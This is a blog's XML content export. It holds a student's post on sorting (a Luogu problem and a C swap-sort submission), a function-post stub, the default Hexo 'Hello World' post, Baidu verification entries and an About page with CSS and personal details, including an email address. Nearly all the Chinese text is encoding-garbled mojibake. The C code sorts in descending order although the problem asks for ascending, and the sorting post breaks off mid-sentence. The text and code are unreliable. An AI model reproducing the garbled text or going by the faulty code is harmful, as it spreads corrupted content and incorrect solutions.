        <content type="html"><![CDATA[<h1 id="è¿™ç¯‡åšå®¢æˆ‘å°†å†™æˆ‘å­¦ä¹ æ’åºçš„è¿‡ç¨‹æˆ‘ä¼šå°†ç§æ’åºå†™åœ¨è¿™ç¯‡æ–‡ç« åº•ä¸‹"><a href="#è¿™ç¯‡åšå®¢æˆ‘å°†å†™æˆ‘å­¦ä¹ æ’åºçš„è¿‡ç¨‹æˆ‘ä¼šå°†ç§æ’åºå†™åœ¨è¿™ç¯‡æ–‡ç« åº•ä¸‹" class="headerlink" title="è¿™ç¯‡åšå®¢æˆ‘å°†å†™æˆ‘å­¦ä¹ æ’åºçš„è¿‡ç¨‹æˆ‘ä¼šå°†ç§æ’åºå†™åœ¨è¿™ç¯‡æ–‡ç« åº•ä¸‹"></a>è¿™ç¯‡åšå®¢æˆ‘å°†å†™æˆ‘å­¦ä¹ æ’åºçš„è¿‡ç¨‹æˆ‘ä¼šå°†ç§æ’åºå†™åœ¨è¿™ç¯‡æ–‡ç« åº•ä¸‹</h1><h2 id="æˆ‘ä¸ªäººæ¯”è¾ƒå–œæ¬¢ç”¨é¢˜ç›®æ¥ç†Ÿæ‚‰ä»£ç æ‰€æœ‰ä¸‹é¢çš„åŸºæœ¬ä¼šç”¨é¢˜ç›®æ¥æå†™"><a href="#æˆ‘ä¸ªäººæ¯”è¾ƒå–œæ¬¢ç”¨é¢˜ç›®æ¥ç†Ÿæ‚‰ä»£ç æ‰€æœ‰ä¸‹é¢çš„åŸºæœ¬ä¼šç”¨é¢˜ç›®æ¥æå†™" class="headerlink" title="æˆ‘ä¸ªäººæ¯”è¾ƒå–œæ¬¢ç”¨é¢˜ç›®æ¥ç†Ÿæ‚‰ä»£ç æ‰€æœ‰ä¸‹é¢çš„åŸºæœ¬ä¼šç”¨é¢˜ç›®æ¥æå†™"></a>æˆ‘ä¸ªäººæ¯”è¾ƒå–œæ¬¢ç”¨é¢˜ç›®æ¥ç†Ÿæ‚‰ä»£ç æ‰€æœ‰ä¸‹é¢çš„åŸºæœ¬ä¼šç”¨é¢˜ç›®æ¥æå†™</h2><p>æˆ‘åœ¨æ´›è°·é‡Œæ‰¾åˆ°äº†è¿™é¢˜</p><hr><h1 id="ã€æ¨¡æ¿ã€‘æ’åº"><a href="#ã€æ¨¡æ¿ã€‘æ’åº" class="headerlink" title="ã€æ¨¡æ¿ã€‘æ’åº"></a>ã€æ¨¡æ¿ã€‘æ’åº</h1><h2 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h2><p>å°†è¯»å…¥çš„ $N$ ä¸ªæ•°ä»å°åˆ°å¤§æ’åºåè¾“å‡ºã€‚</p><h2 id="è¾“å…¥æ ¼å¼"><a href="#è¾“å…¥æ ¼å¼" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h2><p>ç¬¬ä¸€è¡Œä¸ºä¸€ä¸ªæ­£æ•´æ•° $N$ã€‚</p><p>ç¬¬äºŒè¡ŒåŒ…å« $N$ ä¸ªç©ºæ ¼éš”å¼€çš„æ­£æ•´æ•° $a_i$ï¼Œä¸ºä½ éœ€è¦è¿›è¡Œæ’åºçš„æ•°ã€‚</p><h2 id="è¾“å‡ºæ ¼å¼"><a href="#è¾“å‡ºæ ¼å¼" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h2><p>å°†ç»™å®šçš„ $N$ ä¸ªæ•°ä»å°åˆ°å¤§è¾“å‡ºï¼Œæ•°ä¹‹é—´ç©ºæ ¼éš”å¼€ï¼Œè¡Œæœ«æ¢è¡Œä¸”æ— ç©ºæ ¼ã€‚</p><h2 id="æ ·ä¾‹-1"><a href="#æ ·ä¾‹-1" class="headerlink" title="æ ·ä¾‹ #1"></a>æ ·ä¾‹ #1</h2><h3 id="æ ·ä¾‹è¾“å…¥-1"><a href="#æ ·ä¾‹è¾“å…¥-1" class="headerlink" title="æ ·ä¾‹è¾“å…¥ #1"></a>æ ·ä¾‹è¾“å…¥ #1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">4 2 4 5 1</span><br></pre></td></tr></table></figure><h3 id="æ ·ä¾‹è¾“å‡º-1"><a href="#æ ·ä¾‹è¾“å‡º-1" class="headerlink" title="æ ·ä¾‹è¾“å‡º #1"></a>æ ·ä¾‹è¾“å‡º #1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 2 4 4 5</span><br></pre></td></tr></table></figure><h2 id="æç¤º"><a href="#æç¤º" class="headerlink" title="æç¤º"></a>æç¤º</h2><p>å¯¹äº $20\%$ çš„æ•°æ®ï¼Œæœ‰ $1 \leq N \leq 10^3$ï¼›</p><p>å¯¹äº $100\%$ çš„æ•°æ®ï¼Œæœ‰ $1 \leq N \leq 10^5$ï¼Œ$1 \le a_i \le 10^9$ã€‚</p><hr><p><strong>æ²¡æœ‰å­¦æ’åºè¯­æ³•çš„æˆ‘ä¸€å¼€å§‹çœ‹åˆ°è¿™é¢˜æˆ‘è§‰å¾—ï¼Œå°±è¿™éšéšä¾¿ä¾¿å°±æ‰“å‡ºæ¥äº†å¥½å—ï¼Ÿ</strong></p><p>äºæ˜¯æˆ‘æäº¤äº†ä¸€ä¸ª<strong>å†’æ³¡æ’åº</strong>åƒä¸‹é¢è¿™æ ·ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span>n = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> arr[<span class="number">100001</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"><span class="keyword">for</span> (;i &lt; n;i++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br><span class="line">arr[i] = a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (j=i+<span class="number">1</span>;j&lt;n;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (arr[i] &lt; arr[j])</span><br><span class="line">&#123;</span><br><span class="line">t = arr[i];</span><br><span class="line">arr[i] = arr[j];</span><br><span class="line">arr[j] = t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ç»“æœå®Œç¾çš„è¶…æ—¶äº†ï¼Œäºæ˜¯æˆ‘åœ¨ç½‘ä¸Šå¯»æ‰¾äº†æ’åºçš„ç®—æ³•ï¼›æ€»å…±6é’Ÿæˆ‘ä¼šåœ¨åº•ä¸‹ä¸€ä¸€ä»‹ç»ï¼ˆè¿™ç¯‡æ–‡ç« æˆ‘å¯èƒ½ä¸ä¼šå¤ªå¿«å†™å®Œå› ä¸ºæœ‰çš„æ’åºè¦æŒ‡é’ˆè€Œæˆ‘ä¸ä¼šæŒ‡é’ˆï¼‰"><a href="#ç»“æœå®Œç¾çš„è¶…æ—¶äº†ï¼Œäºæ˜¯æˆ‘åœ¨ç½‘ä¸Šå¯»æ‰¾äº†æ’åºçš„ç®—æ³•ï¼›æ€»å…±6é’Ÿæˆ‘ä¼šåœ¨åº•ä¸‹ä¸€ä¸€ä»‹ç»ï¼ˆè¿™ç¯‡æ–‡ç« æˆ‘å¯èƒ½ä¸ä¼šå¤ªå¿«å†™å®Œå› ä¸ºæœ‰çš„æ’åºè¦æŒ‡é’ˆè€Œæˆ‘ä¸ä¼šæŒ‡é’ˆï¼‰" class="headerlink" title="ç»“æœå®Œç¾çš„è¶…æ—¶äº†ï¼Œäºæ˜¯æˆ‘åœ¨ç½‘ä¸Šå¯»æ‰¾äº†æ’åºçš„ç®—æ³•ï¼›æ€»å…±6é’Ÿæˆ‘ä¼šåœ¨åº•ä¸‹ä¸€ä¸€ä»‹ç»ï¼ˆè¿™ç¯‡æ–‡ç« æˆ‘å¯èƒ½ä¸ä¼šå¤ªå¿«å†™å®Œå› ä¸ºæœ‰çš„æ’åºè¦æŒ‡é’ˆè€Œæˆ‘ä¸ä¼šæŒ‡é’ˆï¼‰"></a>ç»“æœå®Œç¾çš„<strong>è¶…æ—¶äº†</strong>ï¼Œäºæ˜¯æˆ‘åœ¨ç½‘ä¸Šå¯»æ‰¾äº†æ’åºçš„ç®—æ³•ï¼›æ€»å…±6é’Ÿæˆ‘ä¼šåœ¨åº•ä¸‹ä¸€ä¸€ä»‹ç»ï¼ˆè¿™ç¯‡æ–‡ç« æˆ‘å¯èƒ½ä¸ä¼šå¤ªå¿«å†™å®Œå› ä¸ºæœ‰çš„æ’åºè¦æŒ‡é’ˆè€Œæˆ‘<strong>ä¸ä¼šæŒ‡é’ˆ</strong>ï¼‰</h4><p>é¦–å…ˆæ˜¯æœ€ç®€å•ä¹Ÿæ˜¯è¿è¡Œæœ€æ…¢çš„å†’æ³¡æ’åºå†’æ³¡æ’åºæ˜¯å¤æ‚çš„æœ€é«˜çš„æ’åºå®ƒçš„ä¸»è¦åŸç†å°±æ˜¯ä»æ•°ç»„çš„ç¬¬</p>]]></content>
      
      
      <categories>
          
          <category> cè¯­è¨€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‡½æ•°</title>
      <link href="/2023/10/29/%E5%87%BD%E6%95%B0/"/>
      <url>/2023/10/29/%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="ç®€ä»‹ï¼šè¿™æ˜¯æˆ‘åœ¨æ´›è°·åˆ·é¢˜æ—¶é‡åˆ°çš„å‡½æ•°é¢˜ç›®ä¸ºäº†èƒ½å¤Ÿæ›´å¥½çš„ç†è§£è¿™é“é¢˜ç›®æˆ‘ä¼šå°†çš„è§£é¢˜è¿‡ç¨‹ä¹¦å†™åœ¨è¿™ç¯‡æ–‡ç« é‡Œã€‚"><a href="#ç®€ä»‹ï¼šè¿™æ˜¯æˆ‘åœ¨æ´›è°·åˆ·é¢˜æ—¶é‡åˆ°çš„å‡½æ•°é¢˜ç›®ä¸ºäº†èƒ½å¤Ÿæ›´å¥½çš„ç†è§£è¿™é“é¢˜ç›®æˆ‘ä¼šå°†çš„è§£é¢˜è¿‡ç¨‹ä¹¦å†™åœ¨è¿™ç¯‡æ–‡ç« é‡Œã€‚" class="headerlink" title="ç®€ä»‹ï¼šè¿™æ˜¯æˆ‘åœ¨æ´›è°·åˆ·é¢˜æ—¶é‡åˆ°çš„å‡½æ•°é¢˜ç›®ä¸ºäº†èƒ½å¤Ÿæ›´å¥½çš„ç†è§£è¿™é“é¢˜ç›®æˆ‘ä¼šå°†çš„è§£é¢˜è¿‡ç¨‹ä¹¦å†™åœ¨è¿™ç¯‡æ–‡ç« é‡Œã€‚"></a>ç®€ä»‹ï¼šè¿™æ˜¯æˆ‘åœ¨æ´›è°·åˆ·é¢˜æ—¶é‡åˆ°çš„å‡½æ•°é¢˜ç›®ä¸ºäº†èƒ½å¤Ÿæ›´å¥½çš„ç†è§£è¿™é“é¢˜ç›®æˆ‘ä¼šå°†çš„è§£é¢˜è¿‡ç¨‹ä¹¦å†™åœ¨è¿™ç¯‡æ–‡ç« é‡Œã€‚</h1><h1 id="å…ˆæŒ–ä¸ªå‘åé¢åœ¨å¡«-çœ‹æ’åº"><a href="#å…ˆæŒ–ä¸ªå‘åé¢åœ¨å¡«-çœ‹æ’åº" class="headerlink" title="å…ˆæŒ–ä¸ªå‘åé¢åœ¨å¡«(çœ‹æ’åº)"></a>å…ˆæŒ–ä¸ªå‘åé¢åœ¨å¡«(çœ‹æ’åº)</h1>]]></content>
      
      
      <categories>
          
          <category> cè¯­è¨€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‡½æ•° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/10/28/hello-world/"/>
      <url>/2023/10/28/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title></title>
      <link href="/baidu_verify_codeva-t6Y9fshzlA.html"/>
      <url>/baidu_verify_codeva-t6Y9fshzlA.html</url>
      
        <content type="html"><![CDATA[52a533e3b2aa22f3ce0859497b2589eb]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>è¿™å°±æ˜¯ï¼ˆä¸€ä¸ªå¹³å¹³æ— å¥‡çš„å¤§å­¦ç”Ÿçš„ï¼‰åˆ†ç±»</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/baidu_verify_codeva-tWN8KDrfR6.html"/>
      <url>/baidu_verify_codeva-tWN8KDrfR6.html</url>
      
        <content type="html"><![CDATA[ea91b333547ce4e46d20121a9e7c8153]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>å“ˆå“ˆå“ˆï¼Œä¸€ä¸ªæ™®é€šå¤§å­¦ç”Ÿçš„ç®€ä»‹(è™½ç„¶æ²¡ä»€ä¹ˆäººçœ‹ï¼Œä½†è¿˜æ˜¯ä»‹ç»ä¸€ä¸‹è‡ªå·±å§(à¹‘â€¢à¸±à¹‡Ï‰â€¢à¹‡à¸±à¹‘))</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<style>    /* å¤´åƒå¡ç‰‡ */    .author-img {        position: relative; /* è®¾ç½®ç›¸å¯¹å®šä½ */    }    .author-box {        text-align: center;        padding: 20px;        height: auto;        border-bottom: 2px solid #ddd;        /* åˆ†å‰²çº¿ */    }    .author-img img {        border-radius: 50%; /* æ˜¾ç¤ºä¸ºåœ†å½¢ */        width: 150px; /* å®½åº¦è®¾ç½® */        height: 150px; /* é«˜åº¦ä¿æŒä¸€è‡´ï¼Œå¦åˆ™å°±æˆæ¤­åœ†äº† */        margin-bottom: 10px;    }    .green-dot {        position: absolute;        right: calc(50% - 67px);        bottom: 13px;        width: 20px; /* å°åœ†ç‚¹çš„å®½åº¦ */        height: 20px; /* å°åœ†ç‚¹çš„é«˜åº¦ */        background-color: rgb(40, 231, 139); /* å°åœ†ç‚¹çš„é¢œè‰²ï¼Œæ„Ÿè§‰å¾ˆå¥½çœ‹ï¼Œå¯¹ç…§ç€QQçš„é¢œè‰²æçš„ */        border-radius: 50%; /* ä½¿å°åœ†ç‚¹å˜æˆåœ†å½¢ */    }    /* æ–‡æœ¬æ ¼å¼ï¼Œå…¨å±€ */    .content h2 {        margin-top: 0;        margin-bottom: 0;    }    /* è®¾ç½®æ¯ä¸€èŠ‚å®½åº¦ï¼Œé«˜åº¦ï¼Œé•¿åº¦ç­‰ç­‰ */    .content .column {        margin-top: 4px;        margin-bottom: 4px;        width: 65%;        margin-left: 20px;    }    /* ç»™ç¬¬ä¸€æ ¼ä¸ªäººä¿¡æ¯è¿›è¡Œé€‚é… */    .content .info-columns {        margin: 10px 0;    }    /* ç¬¬ä¸€æ ¼çš„ä¸ªäººä¿¡æ¯ï¼Œæˆ‘ä½¿ç”¨äº†è¡¨æ ¼ï¼Œä¸ºäº†æ˜¾ç¤ºæ›´å¤šä¿¡æ¯çš„åŒæ—¶ä¸ç©ºå‡ºå¤§éƒ¨åˆ†åœ°æ–¹ï¼Œä½ ä»¬è‡ªè¡Œé€‰æ‹© */    .content .row {        display: flex;        justify-content: space-between;    }    /* æ¯ä¸€èŠ‚é€šç”¨æ ¼å¼ */    .section {        display: flex;        padding: 10px;        align-items: center;        justify-content: space-between;        border-bottom: none;        margin-top: 20px;        margin: 20px 10px 0 10px;        border-radius: 10px;        background-color: white;        height: 250px;        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);    }    /* å¤œé—´é€‚é…ï¼Œæ”¹å˜èƒŒæ™¯å’Œç›¸å…³é˜´å½±éƒ¨åˆ† */    [data-theme=dark] .section {        background-color: #2c2c2c;        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);    }    /* å³å›¾å·¦æ–‡æ ·å¼ï¼Œå·¦è¾¹ä¸ºrowï¼Œå› ä¸ºæ˜¯é»˜è®¤çš„æ‰€ä»¥ä¸éœ€è¦æŒ‡å®š */    .section.right {        flex-direction: row-reverse;    }    /* èŠ‚å†…å›¾ç‰‡æ‰€åœ¨ä½ç½®ç›¸å…³æ ¼å¼ï¼Œè¿™é‡Œæ˜¯å› ä¸ºæˆ‘å¼€äº†fancyboxï¼Œä¹Ÿå°±æ˜¯ç‚¹å‡»é¢„è§ˆå¤§å›¾çš„æ•ˆæœï¼Œä½¿å›¾ç‰‡è¢«ä¸€ä¸ªaæ‰€åŒ…è£¹ï¼Œå¦‚æœä½ å…³äº†è¯·è‡ªè¡Œå°†è¯¥å†…å®¹æ·»åŠ åˆ°ä¸‹é¢çš„imgä¸­ï¼Œå…¶ä»–ä½ç½®å¯¹åº”è°ƒæ•´ */    .section a {        width: 45%;        height: 100%;        transition: transform 0.5s ease; /* æ·»åŠ è¿‡æ¸¡æ•ˆæœ */    }    /* èŠ‚å†…Aæ ‡ç­¾å†…çš„å›¾ç‰‡ï¼Œå æ»¡aæ ‡ç­¾ï¼Œå¹¶ä¸æ‹‰ä¼¸ï¼Œä½¿ç”¨è¦†ç›–ï¼Œè‡ªé€‚åº”å¤§å° */    .section img {        width: 100%;        height: 100%;        object-fit: cover;        border-radius: 8px;    }    /* åœ¨é¼ æ ‡æ‚¬åœåœ¨ .section ä¸Šæ—¶ï¼Œæ”¾å¤§å›¾ç‰‡ */    .section:hover a {        transform: scale(1.10); /* å°†å›¾ç‰‡æ”¾å¤§10% */    }    /* è®¾ç½®æ”¾å¤§åªåœ¨å½“å›¾ç‰‡æ²¡æœ‰æ¶ˆå¤±æ—¶ï¼Œå¦åˆ™è¿™ä¸ªå®½åº¦ä¼šè¦†ç›–æ‰è®¾ç½®çš„å°æ—¶å€™ä¸º100%çš„è®¾å®š */    @media (min-width: 870px) {        /* å›¾åƒåœ¨å³è¾¹çš„èŠ‚ï¼Œå½“é¼ æ ‡æ”¾å…¥ï¼Œé€‚å½“å‘å·¦åç§»ï¼Œé€ æˆå¥½åƒè¢«å›¾åƒæŒ¤è¿‡å»çš„è§†è§‰æ•ˆæœ */        .section.right:hover .content {            margin-left: 10px;        }        /* é€šç”¨ï¼Œå› ä¸ºæ–‡å­—æ˜¯é å·¦çš„ï¼Œæ”¹å˜å®½åº¦å°±è¢«æŒ¤è¿‡å»äº† */        .section:hover .content {            width: 50%;            width: 50%;        }    }    /* é€šç”¨æ–‡å­—éƒ¨åˆ†åŸºç¡€è®¾ç½® */    .section .content {        width: 55%;        margin: 20px 20px;        max-height: 100%;        overflow: hidden; /* è¶…å‡ºéƒ¨åˆ†ä¸å¥½çœ‹ï¼Œæˆ‘ç»™éšè—äº†ï¼Œçœ‹ä¸è§ä¹Ÿæ¯”è¶…å‡ºå¼ºï¼Œä¸è¿‡è¿™ä¸ªå¯ä»¥é€šè¿‡ä¿®æ”¹å„ç§å®½åº¦é«˜åº¦è¿›è¡Œä¸ªæ€§é€‚é… */        text-overflow: ellipsis;        transition: width 0.5s ease, margin-left 0.3s ease; /* æ·»åŠ è¿‡æ¸¡æ•ˆæœ */    }    /* æœ€ä¸‹æ–¹çš„ä¸€å †ä¸ªäººç«™ç‚¹ */    .wrapper {        text-align: center; /* æ–‡å­—å±…ä¸­ */        padding: 10px;        margin: 20px 10px 0 10px;        border-radius: 10px;        background-color: white;        height: auto;        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);    }    /* å››ä¸ªå¤§å­— */    .wrapper .label {        margin: 20px 20px;    }    /* ç½‘æ ¼ç›¸å…³é“¾æ¥å¸ƒå±€æ ·å¼ */    .wrapper .site-grid {        margin-top: 10px;        border-radius: 8px;        display: grid;        grid-template-columns: repeat(4, 1fr); /* ä¸€è¡Œå››å— */        gap: 10px; /* å—ä¹‹é—´çš„é—´éš™ */        width: 100%;        height: auto; /* å®½åº¦è‡ªåŠ¨å¡«å…… */    }    /* æ¯ä¸ªç«™ç‚¹å—çš„æ ·å¼ */    .wrapper .site-grid .site-item {        z-index: 1;        border-radius: 10px;        position: relative;        width: 100%;/* å®½åº¦è‡ªåŠ¨å¡«å…… */        height: 200px;/* è®¾ç½®å—çš„é«˜åº¦ */        background-size: cover;/* èƒŒæ™¯å›¾ç‰‡å¡«å……æ•´ä¸ªå— */        background-position: center;/* èƒŒæ™¯å›¾ç‰‡å±…ä¸­ */        display: flex;        justify-content: center;        align-items: center;        text-decoration: none;        overflow: hidden; /* ä½¿è¶…å‡ºè¾¹æ¡†çš„å†…å®¹éšè— */        transition: transform 0.3s ease-in-out, z-index 0.3s ease-in-out;    }    /* åŠ¨ç”»æ•ˆæœï¼Œé¼ æ ‡æ”¾ä¸Šå»æ—¶èƒŒæ™¯å›¾ç‰‡æ”¾å¤§çš„åŠ¨ç”» */    @media (min-width: 870px) {        .wrapper .site-grid .site-item:hover {            transform: scale(1.2); /* æ”¾å¤§å€æ•° */            z-index: 2;        }    }    /* å—ä¸­çš„å­—è¦†ç›–å±‚æ ·å¼ */    .wrapper .site-overlay {        position: absolute;        inset: 0; /* å°† top, right, bottom, left éƒ½è®¾ä¸º 0 */        border-radius: 10px;        background: rgba(255, 255, 255, 0.5); /* åˆå§‹ä¸ºé€æ˜èƒŒæ™¯ */        transition: background 0.6s, color 0.6s; /* èƒŒæ™¯è¿‡æ¸¡æ•ˆæœ */        display: flex;        text-align: center;        justify-content: center;        align-items: center;        font: bold 25px sans-serif; /* æ ¹æ®éœ€æ±‚æ›´æ”¹å­—ä½“å¤§å° */        color: #000000; /* æ ¹æ®éœ€æ±‚æ›´æ”¹å­—ä½“é¢œè‰²ï¼Œé»˜è®¤æ˜¯é»‘ */    }    /* é¼ æ ‡æ‚¬åœæ—¶çš„æ ·å¼ */    .wrapper .site-item:hover .site-overlay {        background: rgba(0, 0, 0, 0.5); /* ç™½åº•å˜é»‘ */        color: #ffffff; /* é»‘å­—å˜ç™½ */    }    /* å¤œé—´é€‚é… */    [data-theme=dark] .wrapper {        background-color: #2c2c2c; /* è¿™æ˜¯æˆ‘å…¨å±€çš„å¤œé—´ç»Ÿä¸€è‰²ï¼Œä½ ä»¬è‡ªå·±çœ‹ */        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);    }    /* å¤œé—´é¼ æ ‡æ‚¬åœåŠ¨æ•ˆé€‚é… */    [data-theme=dark] .wrapper .site-item:hover .site-overlay {        background: rgba(255, 255, 255, 0.5);        color: #000000;    }    /* å¤œé—´å¡ç‰‡èƒŒæ™¯é€‚é…ï¼Œå’Œç™½å¤©æ˜¯ç›¸åçš„ */    [data-theme=dark] .wrapper .site-overlay {        background: rgba(0, 0, 0, 0.5);        color: #ffffff;    }    /* çª„å±é€‚é… */    @media (max-width: 870px) {/* å½“é¡µé¢å®½åº¦å°äº870åƒç´ æ—¶ */        /* ä¸æ˜¾ç¤ºå›¾ç‰‡ */        .section a {            display: none;        }        /* å°†ä½ç½®ç•™ç»™æ–‡å­— */        .section .content {            width: 100%;        }        /* é«˜åº¦è‡ªå·±è°ƒæ•´ï¼Œå› ä¸ºçª„å±è§†é‡æ²¡æœ‰é‚£ä¹ˆå¤§ï¼Œéƒ¨åˆ†èŠ‚çª„ä¸€ç‚¹å®½ä¸€ç‚¹ä¸å½±å“ï¼Œä½†æ˜¯æœ€å°ä»ç„¶æ˜¯ä¹‹å‰è®¾ç½®çš„å€¼ï¼Œè¿™ä¸ªéœ€è¦ä½ ä»¬è‡ªå·±æ”¹ */        .section {            height: auto;            min-height: 250px;        }        /* ä¸‹æ–¹é“¾æ¥åˆ°ç°åœ¨æ˜¾ç¤ºä¸ºä¸¤åˆ—ï¼Œè¦ä¸ç„¶æŒ¤å¾—ä¸è¡Œ */        .wrapper .site-grid {            grid-template-columns: repeat(2, 1fr);            /* ä¸€è¡Œæ˜¾ç¤º2ä¸ªå— */            grid-auto-rows: 200px;            /* ä¿æŒè¡Œé«˜ä¸€è‡´ */        }    }    /* å½“é¡µé¢å®½åº¦å°äº480åƒç´ æ—¶ï¼Œæˆ‘ä»¬çš„è¡¨æ ¼æˆä¸º1åˆ— */    @media (max-width: 560px) {        .wrapper .site-grid {            grid-template-columns: repeat(1, 1fr);            /* ä¸€è¡Œæ˜¾ç¤º1ä¸ªå— */            grid-auto-rows: 200px;            /* ä¿æŒè¡Œé«˜ä¸€è‡´ */        }    }</style><div class="author-box">    <div class="author-img">        <img class="no-lightbox" src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/%E5%9B%BE%E7%89%87/1231.jpg">        <div class="green-dot"></div>    </div>    <div class="image-dot"></div>    <p class="p center logo large"><h2>å…³äºæˆ‘</h2></p>    <p class="p center small"><b>ä¸€ä¸ªä¸Šäº†å¤§å­¦æ‰å¯¹è®¡ç®—æœºæ„Ÿå…´è¶£çš„è‹¦é€¼webæ‰‹</b></p></div><div class="section left">    <img src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/img/about2.jpg">    <div class="content">        <div class="info-columns">            <h2>ä¸ªäººä¿¡æ¯</h2>            <ul>                <div class="row">                    <div class="column">                        <li>å§“å: LSE</li>                        <li>ä½å€: ç¦å»ºçœ</li>                        <li>æœªæ¥çš„å¹»æƒ³: æ‰¾ä¸ªç¨³å®šçš„å·¥ä½œï¼Œæœ‰ä¸ªå°å®¶åº­ï¼Œå¹³å¹³æ·¡æ·¡çš„è¿‡ä¸€è¾ˆå­</li>                    </div>                    <div class="column">                        <li>æ€§åˆ«: ç”·</li>                        <li>å¹´çº§: äºŒã€‡äºŒä¸‰çº§</li>                        <li>ä¸“ä¸š: ç½‘ç»œç©ºé—´å®‰å…¨</li>                    </div>                </div>                <li>é‚®ç®±: 2488218724@qq.com</li>            </ul>        </div>    </div></div><div class="section right">    <img 